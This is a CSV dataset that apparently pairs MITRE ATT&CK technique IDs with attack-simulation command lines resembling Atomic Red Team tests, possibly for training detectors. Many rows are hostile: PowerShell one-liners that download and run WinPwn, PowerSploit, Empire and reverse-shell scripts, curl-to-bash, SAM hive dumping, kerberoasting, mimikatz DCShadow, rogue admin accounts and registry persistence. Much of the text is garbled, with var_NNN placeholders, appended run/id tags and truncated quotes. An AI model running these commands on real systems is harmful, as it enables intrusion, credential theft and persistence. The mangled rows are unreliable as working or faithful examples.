mitre_id,command
T1220,"""var_89739"""
T1027,"invoke-expression ""#{input_file}"""
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh# run_3827
T1048,"import-module ""var_353"
T1037,sudo cp var_7763 \tmp\t1037_005_agent.plist \library\startupitems\atomic.sh start
T1003,"""#{dumpert_exe}""# run_7629"
T1195,"kubectl  run  var_84078  --no-audit  --no-fund  --no-package-lock  &&  echo  '---  package.json  after  install  ---'  &&  cat  package.json"""
T1083,ls -recurse get-childitem -recurse gci -recurse
T1553,regsvr32.exe var_696
T1098,"import-module msonline import-module azuread $password = convertto-securestring -string ""var_788"""
T1574,"set dotnet_startup_hooks=""var_37814"" dotnet -h > nul echo."
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_167\extension\"" -passthru"
T1134,". ""$pathtoatomicsfolder\t1134.004\src\ppid-spoof.ps1"" $ppid=get-process var_68629"""
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive> /dev/null 2>&1 # id_87
T1127,"copy ""var_54447 %temp%\hello.js"
T1105,"# check if the folder exists, create it if it doesn't $folderpath = ""var_332"
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_330"""
T1098,"$credfile = ""var_623"
T1518,"wmic /node:localhost /namespace:\\root\microsoft\windows\defender path msft_mppreference get /format:list | findstr /i /c:""disablerealtimemonitoring"" /c:""exclusionpath"" /c:""exclusionextension"" /c:""exclusionprocess""# run_6616"
T1218,invoke-athcompiledhelp -simulateuserdoubleclick -chmfilepath #{chm_file_path}
T1123,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f# run_2862
T1609,"docker  build  -t  t1609  $pathtoatomicsfolder\t1609\src\  docker  run  --name  t1609_container  --rm  -itd  t1609  bash  \tmp\script.sh  docker  exec  -i  t1609_container  bash  -c  ""cat  \tmp\output.txt"""
T1547,"if (!(test-path -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer"")){ new-item -itemtype key -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer"" } if (!(test-path -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer\run"")){ new-item -itemtype key -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer\run"" } set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer\run"" -name ""#{target_key_value_name}"" -value ""#{payload}"""
T1040,sudo  var_923  -a  -f  -t  3
T1119,mkdir  %temp%\t1119_command_prompt_collection  >nul  2>&1  dir  c:  \b  \s  .docx  |  findstr  \e  .docx  for  \r  c:\  %f  in  (*.docx)  do  copy  \y  %f  %temp%\t1119_command_prompt_collection> /dev/null 2>&1 # id_53
T1071,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\lukebaggett\dnscat2-powershell\45836819b2339f0bb64eaf294f8cc783635e00c6\dnscat2.ps1') start-dnscat2 -domain var_123
T1222,var_820
T1039,copy \\var_223
T1570,new-smbmapping -remotepath 'var_22964' 'z:\'
T1220,"wmic #{wmic_command} /format:""#{remote_xsl_file}"""
T1195,"kubectl run var_730 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1620,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  mimiload  -consoleoutput  -noninteractive
T1087,"$target = $env:logonserver $target = $target.trim(""\\"") $ipaddress = [system.net.dns]::gethostaddresses($target) | select ipaddresstostring -expandproperty ipaddresstostring wmic.exe \node:$ipaddress process call create 'wevtutil epl security c:\\ntlmusers.evtx \q:\""event[system[(eventid=56495)]]""'"
T1110,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe passwordspray --dc var_15092 ""pathtoatomicsfolder\..\externalpayloads\passwordspray.txt"" password132"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_495"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1059,cd /tmp curl -s #{remote_url} |bash ls -la /tmp/art.txt# run_5336
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_18245"""
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_339"""
T1559,"start ""$pathtoatomicsfolder\t1559.002\bin\dde_document.docx""> /dev/null 2>&1 # id_78"
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_927"""
T1216,set comspec=var_176 cscript %windir%\system32\manage-bde.wsf
T1069,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\f94a5d298a1b4c5dfb1f30a246d9c73d13b22888\recon\powerview.ps1' -usebasicparsing); find-localadminaccess -verbose; echo 46 > $null
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd \c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_99581"")"
T1115,apt  install  xclip  -y  history  |  tail  -n  30  |  xclip  -sel  clip  xclip  -o  >  history.txt> /dev/null 2>&1 # id_39
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh# run_6565
T1137,reg.exe add hkcu\software\microsoft\office\#{outlook_version}\outlook\webview\#{outlook_folder} /v url /t reg_sz /d #{url} /f# run_1755
T1055,$process  =  start-process  var_91475  -passthru  $pathtoatomicsfolder\t1055\bin\x64\createremotethreadnative.exe  -pid  $process.id  -debug
T1049,$syntaxlist = var_49779
T1039,copy  \\var_192
T1136,"net user \add ""var_170"""
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh# run_2803
T1595,"import-module  ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1""  invoke-wordlistscan  -target  ""var_85455"""
T1047,powershell -exec bypass -e sqbuahyabwbragualqbxag0aaqbnaguadaboag8azaagac0auabhahqaaaagahcaaqbuadmamgbfahaacgbvagmazqbzahmaiaatae4ayqbtaguaiabjahiazqbhahqazqagac0aqqbyagcadqbtaguabgb0aewaaqbzahqaiabuag8adablahaayqbkac4azqb4agua> /dev/null 2>&1 # id_15
T1134,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/bc-security/empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/get-system.ps1' -usebasicparsing); get-system -technique token -verbose
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 5> /dev/null 2>&1 # id_74"
T1129,"var_378"""
T1095,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\samratashok\nishang\c75da7f91fcc356f846e09eab0cfd7f296ebf746\shells\invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress var_327
T1049,$syntaxlist = var_17135
T1556,"sudo sed -i ""var_519"
T1547,"file=`find  ~\library\preferences\byhost\com.apple.loginwindow.*.plist  -type  f  |  head  -1`  if  [  -z  ""${file}""  ]  ;  then  echo  ""no  loginwindow  plist  file  found""  &&  exit  1  ;  fi  echo  save  backup  copy  to  \tmp\  cp  ${file}  \tmp\t1547007_loginwindow-backup.plist  echo  before  plutil  -p  ${file}  echo  overwriting...  var_343"
T1548,"""var_69174"""
T1012,"new-psdrive  -psprovider  registry  -root  hkey_classes_root  -name  hkcr  get-childitem  -path  hkcr:\clsid  -name  |  select  -skip  1  >  $env:temp\clsids.txt  foreach($clsid  in  get-content  ""$env:temp\clsids.txt"")  {try{write-output  ""$($position)-$($clsid)""  write-output  ""------------""|  out-file  var_64273"
T1486,which_openssl=`which openssl` $which_openssl genrsa -out var_963
T1218,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/logfile= /logtoconsole=false /u `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_uninstall_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs if ($actualoutput -ne $expectedoutput) { throw @"" installutil uninstall method execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }> /dev/null 2>&1 # id_95"
T1115,echo get-process | clip get-clipboard | iex> /dev/null 2>&1 # id_30
T1010,c:\windows\microsoft.net\framework\v4.0.43274\csc.exe -out:var_13036
T1578,az snapshot create --resource-group var_138 --location eastus
T1547,"$oldvalue = $(get-itempropertyvalue -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit""); set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit-backup"" -value ""$oldvalue""; $newvalue = $oldvalue + "" var_20463""; set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit"" -value ""$newvalue"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)> /dev/null 2>&1 # id_14"
T1114,"$ss = convertto-securestring ""var_809"
T1078,net user art-test \add net user art-test var_28756 net localgroup administrators art-test \add
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_930 write-host ""end of golden saml"""
T1087,"cd  ""pathtoatomicsfolder\..\externalpayloads""  .\kerbrute.exe  userenum  -d  var_56378  ""pathtoatomicsfolder\..\externalpayloads\username.txt"""
T1570,new-smbmapping -remotepath 'var_706' 'z:\'
T1505,"xcopy \i \y ""var_303"
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_641"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_763"
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive> /dev/null 2>&1 # id_84
T1497,"if [ ""$(sysctl -n hw.model | grep -v 'mac')"" != """" ]; then echo 'virtualization environment detected'; fi;"
T1083,dir  \s  c:\  >>  var_38360
T1619,"try{$response  =  invoke-webrequest  ""https:\\var_49779  -append"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }# run_3282"
T1039,copy \\var_78235
T1030,$file = [system.io.file]::openread(var_820 $file.close()
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""> /dev/null 2>&1 # id_73"
T1120,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt# run_6160"
T1020,"$filename = ""var_486"
T1059,#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}# run_7496
T1006,"$buffer  =  new-object  byte[]  11  $handle  =  new-object  io.filestream  ""\\.\var_58704"",  'open',  'read',  'readwrite'  $handle.read($buffer,  0,  $buffer.length)  $handle.close()  format-hex  -inputobject  $buffer"
T1505,"xcopy \i \y ""var_862"
T1113,screencapture var_98066
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh> /dev/null 2>&1 # id_96
T1611,"echo ""current user: var_96036"" sudo -u docker_user sh -c ""sudo docker run -v \:\mnt --rm --name t1611_privesc -it alpine chroot \mnt id"""
T1046,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  bluekeep  -noninteractive  -consoleoutput> /dev/null 2>&1 # id_94
T1049,sockstat -4 sockstat -6 2>/dev/null || true sockstat -l 2>/dev/null || true> /dev/null 2>&1 # id_70
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')""# run_6195"
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_912"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1218,"rundll32.exe ""#{input_file}"",#2"
T1558,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1') invoke-rubeus -command ""kerberoast /format:hashcat /nowrap""# run_4301"
T1615,get-gpo  -domain  $env:userdnsdomain  var_22209
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh# run_2928
T1482,"""var_783"
T1140,encoded=$(echo 'var_325 | b64decode -r
T1083,"echo """" | ""var_82664"""
T1219,"invoke-webrequest -outfile c:\users\$env:username\desktop\anydesk.exe https:\\download.anydesk.com\anydesk.exe $file1 = ""c:\users\"" + $env:username + ""\desktop\anydesk.exe"" start-process $file1 \s;"
T1059,"awk 'begin {system(""/bin/sh &"")}'"
T1095,"cmd \c ""var_64463"
T1021,"reg  add  ""hklm\system\currentcontrolset\control\terminal  server\winstations\rdp-tcp""  \v  portnumber  \t  reg_dword  \d  var_990"
T1615,get-gpo -domain $env:userdnsdomain var_84505
T1221,"start ""var_89208"""
T1221,"start ""var_708"""
T1003,cmdkey \list
T1612,docker build -t t1612 $pathtoatomicsfolder\t1612\src\ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container .\test.sh> /dev/null 2>&1 # id_87
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_323"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_852"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1518,"reg query ""hkey_local_machine\software\microsoft\internet explorer"" \v svcversion> /dev/null 2>&1 # id_97"
T1114,"$ss = convertto-securestring ""var_155"
T1547,"$runkey = ""var_839"""
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/namedpipe/namedpipesystem.ps1')> /dev/null 2>&1 # id_35
T1652,kextfind# run_3908
T1124,net time \\var_74841 w32tm \tz
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""# run_9817"
T1518,"/usr/libexec/plistbuddy -c ""print :cfbundleshortversionstring"" /applications/safari.app/contents/info.plist /usr/libexec/plistbuddy -c ""print :cfbundleversion"" /applications/safari.app/contents/info.plist# run_7100"
T1567,new-item var_349:test -v
T1207,"#  starting  fake  dc  server,  as  system  (required)  $dc_output_file  =  ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log""  remove-item  $dc_output_file  -erroraction  ignore  $mimikatzparam  =""`""log  $dc_output_file`""  `""lsadump::dcshadow  \object:var_510""  ""lsadump::dcshadow  \push""  ""exit""  write-host  ""`nwaiting  for  fake  dc  server  to  return""  wait-process  $dc  write-host  ""`noutput  from  fake  dc  server:""  get-content  $dc_output_file  start-sleep  1  #  wait  a  little  until  the  file  is  not  locked  anymore  so  we  can  actually  delete  it  remove-item  $dc_output_file  -erroraction  ignore  write-host  ""end  of  dcshadow"""
T1083,"echo """" | ""var_622"""
T1124,net time \\var_88129 w32tm \tz
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached# run_5813"
T1547,cp var_108 ~\library\preferences\byhost\com.apple.loginwindow.plist
T1115,echo  get-process  |  clip  get-clipboard  |  iex# run_6563
T1613,podman build -t t1613 $pathtoatomicsfolder\t1613\src\ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)> /dev/null 2>&1 # id_66
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_220"""
T1652,lsmod# run_1816
T1053,at 13:20 /interactive cmd
T1110,"useradd -g sudo -s \bin\bash -p $(openssl passwd -1 password123) art su -c ""cd \tmp; curl -s var_150 | bash"" art"
T1046,nmap -pn -sv -p var_3426
T1127,"copy ""var_404 %temp%\hello.js"
T1558,"cmd.exe /c ""#{local_folder}\#{local_executable}"" asreproast /outfile:""#{local_folder}\#{out_file}"""
T1137,reg.exe add hkcu\software\microsoft\office\var_642 \f
T1113,import -window root #{output_file}
T1006,"$buffer  =  new-object  byte[]  11  $handle  =  new-object  io.filestream  ""\\.\var_284"",  'open',  'read',  'readwrite'  $handle.read($buffer,  0,  $buffer.length)  $handle.close()  format-hex  -inputobject  $buffer"
T1496,yes > \dev\null# run_4906
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_494"""
T1566,"#  add  user32.dll  for  keybd_event  add-type  @""  using  system;  using  system.runtime.interopservices;  public  class  k  {  [dllimport(""user32.dll"")]  public  static  extern  void  keybd_event(byte  bvk,  byte  bscan,  uint  dwflags,  uintptr  dwextrainfo);  }  ""@  #  virtual  key  codes  $vk_lwin,  $vk_r,  $keydown,  $keyup  =  0x5b,  0x52,  0x0000,  0x0002  #  open  run  dialog  (win+r)  [k]::keybd_event($vk_lwin,  0,  $keydown,  [uintptr]::zero)  [k]::keybd_event($vk_r,  0,  $keydown,  [uintptr]::zero)  [k]::keybd_event($vk_r,  0,  $keyup,  [uintptr]::zero)  [k]::keybd_event($vk_lwin,  0,  $keyup,  [uintptr]::zero)  #  short  delay  for  run  dialog  start-sleep  -milliseconds  500  add-type  -assemblyname  system.windows.forms  [system.windows.forms.sendkeys]::sendwait(""cmd  \c  powershell  -ec  ""  +  [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_31186"")"
T1078,"useradd --shell \bin\bash --create-home --password $(openssl passwd -1 art) art usermod --lock art usermod --expiredate ""1"" art usermod --unlock art usermod --expiredate ""99999"" art su -c whoami art"
T1095,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\besimorhino\powercat\ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5\powercat.ps1') powercat -c var_85148
T1218,invoke-cimmethod -classname win32_product -methodname #{action} -arguments @{ packagelocation = '#{msi_payload}' }# run_8100
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""var_216"" -credential $creds"
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_695\extension\"" -passthru"
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_84122"
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_705 -method post -body $cyphertext -disablekeepalive"
T1543,sc config var_824
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_339"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1546,"reg export ""hkey_current_user\control panel\desktop"" %userprofile%\backup.reg copy #{input_binary} ""%systemroot%\system32\evilscreensaver.scr"" reg.exe add ""hkey_current_user\control panel\desktop"" /v screensaveactive /t reg_sz /d 1 /f reg.exe add ""hkey_current_user\control panel\desktop"" /v screensavetimeout /t reg_sz /d 60 /f reg.exe add ""hkey_current_user\control panel\desktop"" /v screensaverissecure /t reg_sz /d 0 /f reg.exe add ""hkey_current_user\control panel\desktop"" /v scrnsave.exe /t reg_sz /d ""%systemroot%\system32\evilscreensaver.scr"" /f if #{reboot} neq 0 shutdown /r /t 0"
T1137,"copy ""pathtoatomicsfolder\t1137.006\bin\addins\pptvbaaddin.ppam"" ""$env:appdata\microsoft\addins\notepad.ppam"" $ver = (new-object -comobject ""powerpoint.application"").version $excelregpath=""hkcu:\software\microsoft\office\$ver\powerpoint\addins\notepad"" new-item -type directory $excelregpath -force | out-null new-itemproperty $excelregpath ""autoload"" -value ""1"" -propertytype dword | out-null new-itemproperty $excelregpath ""path"" -value ""notepad.ppam"" -propertytype string | out-null stop-process -name ""powerpnt"" -erroraction ignore start-process ""powerpnt""> /dev/null 2>&1 # id_59"
T1497,ping  -c  var_819
T1187,"&  ""var_276  write-host  ""end  of  petitpotam  attack"""
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_82408 -method post -body $cyphertext -disablekeepalive"
T1132,echo -n 111-11-1111 | base64 curl -xpost var_251
T1070,"net use c: #{share_name} net share test=#{share_name} /remark:""test share"" /cache:no"
T1595,"import-module  ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1""  invoke-wordlistscan  -target  ""var_479"""
T1071,for($i=0; $i -le var_765
T1119,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt# run_4060
T1518,"netsh.exe  advfirewall  show  allprofiles  netsh.exe  advfirewall  firewall  dump  netsh.exe  advfirewall  show  currentprofile  netsh.exe  advfirewall  firewall  show  rule  name=all  netsh.exe  firewall  show  state  netsh.exe  firewall  show  config  sc  query  windefend  powershell.exe  \c  ""get-process  |  where-object  {  $_.processname  -eq  'sysmon'  }""  powershell.exe  \c  ""get-service  |  where-object  {$_.displayname  -like  '*sysm*'}""  powershell.exe  \c  ""get-ciminstance  win32_service  -filter  'description  =  ''system  monitor  service'''""  tasklist.exe  tasklist.exe  |  findstr  \i  virus  tasklist.exe  |  findstr  \i  cb  tasklist.exe  |  findstr  \i  defender  tasklist.exe  |  findstr  \i  cylance  tasklist.exe  |  findstr  \i  mc  tasklist.exe  |  findstr  \i  ""virus  cb  defender  cylance  mc"""
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_35091"""
T1055,"$mypid = var_701"" stop-process -processname notepad"
T1003,reg export hklm\sam %temp%\sam reg export hklm\system %temp%\system reg export hklm\security %temp%\security
T1123,sh var_13630
T1072,"""%programfiles(x86)%\var_17741"""
T1552,mkdir #{output_folder} find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -rr {} #{output_folder} \; exit 0
T1087,"ldapsearch -h ldap://#{domain}.#{top_level_domain}:389 -x -d #{user} -w #{password} -b ""cn=users,dc=#{domain},dc=#{top_level_domain}"" -s sub -a always -z 25728 dn"
